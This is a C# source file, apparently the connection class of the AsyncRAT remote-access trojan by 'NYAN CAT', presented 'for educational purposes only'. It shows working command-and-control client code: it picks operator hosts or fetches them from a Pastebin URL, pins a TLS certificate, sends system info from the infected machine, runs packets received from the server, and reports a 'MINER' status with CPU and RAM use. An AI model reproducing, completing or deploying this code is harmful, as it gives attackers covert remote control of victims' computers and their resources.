using Client.Handle_Packet;
using Client.Helper;
using Client.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using Client.Algorithm;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Connection
{
    public static class ClientSocket
    {
        public static Socket TcpClient { get; set; }
        public static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();

        public static void InitializeClient()
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                if (Settings.Pastebin == "null")
                {
                    string ServerIP = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
                    int ServerPort = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);

                    if (IsValidDomainName(ServerIP)) //check if the address is alphanumric (meaning its a domain)
                    {
                        IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); //get all IP's connected to that domain

                        foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
                        {
                            try
                            {
                                TcpClient.Connect(theaddress, ServerPort); //lets try and connect!
                                if (TcpClient.Connected) break;
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        TcpClient.Connect(ServerIP, ServerPort); //legacy mode connect (no DNS)
                    }
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Settings.Pastebin);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Settings.Hosts = spl[0];
                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
                        TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                    }
                }

                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    Buffer = new byte[4];
                    MS = new MemoryStream();
                    Send(Methods.SendInfo());
                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                return;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.ServerCertificate.Equals(certificate);
        }

        public static void Reconnect()
        {

            try
            {
                Tick?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                MS?.Dispose();
            }
            catch { }
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    if (MS.Length == 4)
                    {
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            while (MS.Length != Buffersize)
                            {
                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
                                if (rc == 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                MS.Write(Buffer, 0, rc);
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(MS.ToArray());
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                        }
                    }
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null)
                    {
                        return;
                    }

                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        int chunkSize = 50 * 1024;
                        byte[] chunk = new byte[chunkSize];
                        using (MemoryStream buffereReader = new MemoryStream(msg))
                        {
                            BinaryReader binaryReader = new BinaryReader(buffereReader);
                            int bytesToRead = (int)buffereReader.Length;
                            do
                            {
                                chunk = binaryReader.ReadBytes(chunkSize);
                                bytesToRead -= chunkSize;
                                SslClient.Write(chunk, 0, chunk.Length);
                                SslClient.Flush();
                            } while (bytesToRead > 0);

                            binaryReader.Dispose();
                        }
                    }
                    else
                    {
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }

    }
}
